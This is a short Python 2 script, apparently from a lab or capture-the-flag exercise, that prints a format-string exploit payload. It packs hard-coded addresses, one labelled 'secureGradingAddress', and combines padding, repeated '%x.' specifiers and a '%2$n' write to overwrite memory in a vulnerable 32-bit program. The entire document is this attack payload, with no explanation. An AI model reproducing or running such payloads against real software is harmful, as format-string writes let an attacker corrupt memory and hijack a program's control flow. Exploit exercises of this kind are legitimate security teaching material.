import struct
#exploit = "AAAA"
secureGradingAddress = struct.pack("I", 0x0804849b)
targetAddress = struct.pack("I", 0x0804a02c)
print "AAAA"+ targetAddress + "BBB" + "%x."*10+"%2$n"+"AAAABBB"+secureGradingAddress
